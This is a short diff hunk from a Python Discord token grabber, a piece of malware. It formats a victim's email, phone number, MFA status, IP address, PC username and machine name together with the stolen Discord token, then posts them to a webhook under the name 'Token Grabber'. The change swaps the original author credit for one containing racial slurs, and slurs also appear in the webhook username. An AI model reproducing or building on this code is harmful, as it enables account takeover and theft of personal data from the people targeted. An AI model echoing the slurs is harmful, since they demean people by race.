@@ -114,7 +114,7 @@ def get_token():
 > :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
 > :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
 > :piñata: __Token__\n\t`{tok}`\n
-*Made by Astraa#6100* **|** ||https://github.com/astraadev||"""
+*Made by A NIGGER* **|** ||https://github.com/XDevyy||"""
                         payload = json.dumps({'content': embed, 'username': 'Token Grabber - ahh i fuck niggers', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
                         try:
                             headers2 = {
